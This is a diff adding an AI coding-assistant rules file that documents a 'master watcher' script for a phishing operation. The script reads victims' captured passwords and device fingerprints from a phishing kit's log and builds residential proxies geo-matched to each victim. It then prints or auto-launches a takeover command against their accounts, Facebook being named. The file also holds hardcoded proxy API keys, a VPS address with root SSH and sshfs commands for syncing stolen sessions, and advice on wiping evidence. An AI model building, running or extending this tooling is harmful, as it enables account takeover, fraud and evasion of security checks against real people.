@@ -1,0 +1,376 @@
+---
+description: "TAGS: [redteam,watcher,automation,takeover,sessions] | TRIGGERS: watcher,automation,takeover,monitor,sessions,trigger | SCOPE: automation | DESCRIPTION: Master watcher automation for credential detection and takeover triggering"
+alwaysApply: false
+---
+# Master Watcher Automation Module
+
+## Scope
+Automated monitoring of sessions.json for new credentials and triggering impersonator2.py for account takeover.
+
+## Architecture Overview
+
+```
+┌─────────────────────────────────────────────────────────────────────────┐
+│                    MASTER WATCHER AUTOMATION FLOW                        │
+├─────────────────────────────────────────────────────────────────────────┤
+│                                                                          │
+│  [sessions.json] ─► [master_watcher2.py] ─► [Detect New Creds]          │
+│        │                    │                       │                    │
+│        ▼                    ▼                       ▼                    │
+│  [Fingerprint]    [Parse Location Data]   [Generate Proxy String]       │
+│  [Credentials]    [Build Profile]         [Print Ready Command]         │
+│  [Location]       [Save to /tmp]          [Manual Execution]            │
+│                                                                          │
+└─────────────────────────────────────────────────────────────────────────┘
+```
+
+## master_watcher2.py Core Implementation
+
+### Configuration
+```python
+#!/usr/bin/env python3
+# master_watcher.py - v7.0 (Unified Log Parser & Automated Takeover Engine)
+
+import subprocess
+import time
+import json
+import os
+import re
+import traceback
+
+# --- HARDCODED CREDENTIALS ---
+DATAIMPULSE_BASE_USER = "768b27aac68d92f840d9"
+DATAIMPULSE_API_KEY = "b7564921f7b4962f"
+DATAIMPULSE_GATEWAY = "gw.dataimpulse.com:10000"
+PROXY_PROTOCOL = "socks5"
+
+# --- Paths ---
+HOME_DIR = os.path.expanduser("~")
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+SITE_DIR = os.path.join(HOME_DIR, ".site")
+SESSIONS_LOG = os.path.join(SITE_DIR, "sessions.json")
+IMPERSONATOR_SCRIPT = os.path.join(BASE_DIR, "impersonator2.py")
+TEMP_PROFILE_DIR = "/tmp/victim_profiles"
+```
+
+### Hyper-Targeted Proxy String Generation
+```python
+def get_hyper_targeted_proxy_string(location_data):
+    """
+    Constructs a hyper-targeted DataImpulse proxy string.
+    Aligned with impersonator2.py generate_dataimpulse_proxy() function.
+    """
+    
+    def clean_param(text):
+        """Standardized location cleaning: lowercase alphanumeric only"""
+        if not text: return ""
+        return re.sub(r'[^a-zA-Z0-9]', '', str(text)).lower()
+    
+    def clean_asn(asn):
+        """Extract ASN number, remove 'AS' prefix"""
+        if not asn:
+            return ''
+        asn_str = str(asn)
+        asn_str = re.sub(r'^[Aa][Ss]', '', asn_str)
+        asn_digits = re.sub(r'[^0-9]', '', asn_str)
+        return asn_digits
+    
+    # Extract location from ip-api.com data
+    country = clean_param(location_data.get('country', 'PH'))
+    region = clean_param(location_data.get('region', 'Metro Manila'))
+    city = clean_param(location_data.get('city', 'Manila'))
+    zip_code = location_data.get('zip', '1000')
+    asn = clean_asn(location_data.get('asn', '132199'))
+    
+    # Build location parameter string
+    location_params = f"cr.{country};state.{region};city.{city};zip.{zip_code};asn.{asn}"
+    
+    # Build complete proxy string
+    username_with_location = f"{DATAIMPULSE_BASE_USER}__{location_params}"
+    proxy_string = f"socks5://{username_with_location}:{DATAIMPULSE_API_KEY}@{DATAIMPULSE_GATEWAY}"
+    
+    print(f"    - Constructed DataImpulse Proxy: socks5://{DATAIMPULSE_BASE_USER}__{location_params}:****@{DATAIMPULSE_GATEWAY}")
+    return proxy_string
+```
+
+### Main Monitoring Loop
+```python
+def main():
+    print(f"[MASTER WATCHER] DataImpulse Hyper-Targeting Engine Online.")
+    print(f"[INFO] Monitoring unified log: {SESSIONS_LOG}")
+    
+    # Create temp directory for profiles
+    if not os.path.exists(TEMP_PROFILE_DIR):
+        os.makedirs(TEMP_PROFILE_DIR)
+    
+    # Track processed credentials per session
+    processed_creds = {}  # { "session_id": num_credentials_processed }
+    
+    while True:
+        try:
+            time.sleep(2)
+            
+            if not os.path.exists(SESSIONS_LOG):
+                continue
+            
+            with open(SESSIONS_LOG, 'r') as f:
+                content = f.read()
+                if not content.strip():
+                    continue
+                all_sessions = json.loads(content)
+            
+            for session in all_sessions:
+                session_id = session.get('sessionId')
+                if not session_id:
+                    continue
+                
+                num_creds_captured = len(session.get('credentials', []))
+                num_creds_processed = processed_creds.get(session_id, 0)
+                
+                # Detect new credentials
+                if num_creds_captured > num_creds_processed:
+                    latest_cred = session['credentials'][-1]
+                    username = latest_cred.get('username')
+                    password = latest_cred.get('password')
+                    
+                    print(f"\n[+] NEW CREDENTIALS DETECTED! Session: {session_id}")
+                    
+                    # Get location data
+                    location_data = session.get('location', {})
+                    print(f"    - Target Location: {location_data}")
+                    
+                    # Construct proxy string
+                    proxy_string = get_hyper_targeted_proxy_string(location_data)
+                    
+                    # Save profile for impersonator
+                    profile_path = os.path.join(TEMP_PROFILE_DIR, f"{session_id}_profile.json")
+                    with open(profile_path, 'w') as pf:
+                        json.dump(session, pf, indent=2)
+                    print(f"    - Saved profile to: {profile_path}")
+                    
+                    # Print ready-to-run command
+                    print_takeover_command(session_id, username, password, profile_path, proxy_string, location_data)
+                    
+                    # Mark as processed
+                    processed_creds[session_id] = num_creds_captured
+        
+        except json.JSONDecodeError:
+            print("[WARNING] Log file being written, skipping cycle.")
+            continue
+        except Exception as e:
+            print(f"[CRITICAL FAILURE] {e}")
+            traceback.print_exc()
+```
+
+### Command Output Function
+```python
+def print_takeover_command(session_id, username, password, profile_path, proxy_string, location_data):
+    """Print ready-to-run impersonator command."""
+    
+    print("\n" + "="*70)
+    print("    [READY STATE] Profile prepared for manual impersonation")
+    print("="*70)
+    print(f"\n    Target: {username}")
+    print(f"    Location: {location_data.get('city', 'N/A')}, {location_data.get('region', 'N/A')}, {location_data.get('country', 'N/A')}")
+    print(f"\n    --- COPY AND RUN THIS COMMAND ---\n")
+    print(f"    python3 ~/universal-redteam-rules/core/impersonator2.py \\")
+    print(f"      --profile \"{profile_path}\" \\")
+    print(f"      --username \"{username}\" \\")
+    print(f"      --password \"{password}\" \\")
+    print(f"      --proxy \"{proxy_string}\"")
+    print("\n" + "="*70 + "\n")
+```
+
+## sessions.json Structure
+
+### Expected Format (from ip.php + login.php)
+```json
+[
+  {
+    "sessionId": "FP_1733500000000_abc123def",
+    "timestamp_first_seen": "2024-12-06 15:30:00",
+    "ip_address": "203.177.x.x",
+    "threat": {
+      "level": 0,
+      "reason": "All Checks Passed"
+    },
+    "location": {
+      "country": "PH",
+      "region": "Metro Manila",
+      "city": "Caloocan City",
+      "zip": "1409",
+      "asn": "132199",
+      "isp": "PLDT",
+      "lat": 14.6488,
+      "lon": 120.9839
+    },
+    "fingerprint": {
+      "sessionId": "FP_1733500000000_abc123def",
+      "userAgent": "Mozilla/5.0 (Linux; Android 12; V2026)...",
+      "platform": "Linux armv8l",
+      "screenResolution": "393x852",
+      "devicePixelRatio": 3,
+      "hardwareConcurrency": 8,
+      "deviceMemory": 8,
+      "language": "en-US",
+      "timezone": "Asia/Manila",
+      "touchSupport": 5,
+      "webGLVendor": "Qualcomm",
+      "webGLRenderer": "Adreno (TM) 610"
+    },
+    "credentials": [
+      {
+        "username": "target@email.com",
+        "password": "captured_password",
+        "timestamp": "2024-12-06 15:35:00"
+      }
+    ]
+  }
+]
+```
+
+## Usage
+
+### Start Watcher
+```bash
+cd ~/universal-redteam-rules/core
+python3 master_watcher2.py
+```
+
+### Expected Output (on new credential)
+```
+[MASTER WATCHER] DataImpulse Hyper-Targeting Engine Online.
+[INFO] Monitoring unified log: /home/user/.site/sessions.json
+
+[+] NEW CREDENTIALS DETECTED! Session: FP_1733500000000_abc123def
+    - Target Location: {'country': 'PH', 'region': 'Metro Manila', 'city': 'Caloocan City', 'zip': '1409', 'asn': '132199'}
+    - Constructed DataImpulse Proxy: socks5://768b27aac68d92f840d9__cr.ph;state.metromanila;city.caloocancity;zip.1409;asn.132199:****@gw.dataimpulse.com:10000
+    - Saved profile to: /tmp/victim_profiles/FP_1733500000000_abc123def_profile.json
+
+======================================================================
+    [READY STATE] Profile prepared for manual impersonation
+======================================================================
+
+    Target: target@email.com
+    Location: Caloocan City, Metro Manila, PH
+
+    --- COPY AND RUN THIS COMMAND ---
+
+    python3 ~/universal-redteam-rules/core/impersonator2.py \
+      --profile "/tmp/victim_profiles/FP_1733500000000_abc123def_profile.json" \
+      --username "target@email.com" \
+      --password "captured_password" \
+      --proxy "socks5://768b27aac68d92f840d9__cr.ph;state.metromanila;city.caloocancity;zip.1409;asn.132199:b7564921f7b4962f@gw.dataimpulse.com:10000"
+
+======================================================================
+```
+
+## Multi-Terminal Workflow
+
+```bash
+# Terminal 1: MaxPhisher template server
+cd ~/universal-redteam-rules/core
+python3 maxphisher2.py
+
+# Terminal 2: Master watcher (auto-detect credentials)
+cd ~/universal-redteam-rules/core
+python3 master_watcher2.py
+
+# Terminal 3: Monitor sessions.json
+watch -n 1 "cat ~/.site/sessions.json | jq '.[-1]'"
+
+# Terminal 4: Execute impersonator (copy command from watcher)
+python3 ~/universal-redteam-rules/core/impersonator2.py \
+  --profile "/tmp/victim_profiles/xxx_profile.json" \
+  --username "target@email.com" \
+  --password "captured_password" \
+  --proxy "socks5://..."
+```
+
+## Automatic vs Manual Execution
+
+### Current: Manual Execution (Safer)
+```python
+# Watcher prints command but does NOT auto-execute
+print_takeover_command(...)
+processed_creds[session_id] = num_creds_captured
+```
+
+### Optional: Auto-Execution (Riskier)
+```python
+# Add this to automatically launch impersonator
+import subprocess
+
+cmd = [
+    "python3", IMPERSONATOR_SCRIPT,
+    "--profile", profile_path,
+    "--username", username,
+    "--password", password,
+    "--proxy", proxy_string
+]
+
+# Launch in background
+process = subprocess.Popen(
+    cmd,
+    stdout=subprocess.PIPE,
+    stderr=subprocess.PIPE,
+    start_new_session=True
+)
+
+print(f"[AUTO] Launched impersonator with PID: {process.pid}")
+```
+
+**Warning**: Auto-execution is risky because:
+1. No manual verification of profile quality
+2. No confirmation of geo-proxy match
+3. May trigger Facebook security on failed attempts
+
+## Error Handling
+
+### JSON Parse Errors
+```python
+except json.JSONDecodeError:
+    # File being written by PHP - skip this cycle
+    print("[WARNING] Log file being written, skipping cycle.")
+    continue
+```
+
+### Missing Fields
+```python
+# Graceful handling of missing data
+session_id = session.get('sessionId')
+if not session_id:
+    continue  # Skip sessions without ID
+
+location_data = session.get('location', {})  # Default to empty dict
+```
+
+### File Not Found
+```python
+if not os.path.exists(SESSIONS_LOG):
+    continue  # Wait for file to be created
+```
+
+## Integration with VPS
+
+### Remote Watcher on VPS
+```bash
+# SSH to VPS and run watcher there
+ssh root@152.42.229.105 "cd /opt/landing && python3 master_watcher.py"
+```
+
+### Sync Local Impersonator
+```bash
+# Run impersonator locally but use VPS sessions.json
+scp root@152.42.229.105:/opt/landing/sessions.json ~/.site/sessions.json
+
+# Or mount via sshfs
+sshfs root@152.42.229.105:/opt/landing ~/.site
+```
+
+## OPSEC Considerations
+
+1. **Profile Cleanup**: Delete /tmp/victim_profiles/ after successful takeover
+2. **Log Rotation**: Clear sessions.json periodically
+3. **Credential Masking**: Never log full passwords
+4. **Timing**: Add random delays between detection and execution
